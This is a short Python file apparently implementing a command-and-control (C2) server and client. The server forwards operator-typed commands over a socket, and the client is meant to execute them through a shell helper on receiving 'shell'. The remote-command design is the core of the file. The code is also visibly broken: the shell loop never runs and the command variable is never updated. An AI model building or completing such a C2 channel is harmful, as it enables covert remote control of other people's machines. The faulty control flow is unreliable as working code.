from helper.socket import Server, Client
from helper.Shell import Shell

class C2Server():
    def __init__(self, host="0.0.0.0", port=7706):
        self.host = host
        self.port = int(port)


    def start_server(self):
        print("[STARTING] server is starting...")
        self.server = Server(self.handle_server, self.host, self.port)

    def start_client(self):
        print("[STARTING] client is starting...")
        self.client = Client(self.handle_client, self.host, self.port)
   
    def handle_server(self, res, instance):
        print(f"[client][{self.host}:{self.port}]: {res}")

        cmd = input(f"[server][{self.host}:{self.port}]: ").strip()
        instance.send(cmd)


    def handle_client(self, res, instance):
        print(f"[server][{self.host}:{self.port}]: {res}")
        shell_started = False
        if res == "shell":
            while shell_started:
                cmd = res
                
                if cmd == "exit":
                    break
                
                shell = Shell(cmd)
                print(shell.run())
                instance.send(f"shell:started")
                
            shell_started = True


        instance.send(res)
        
   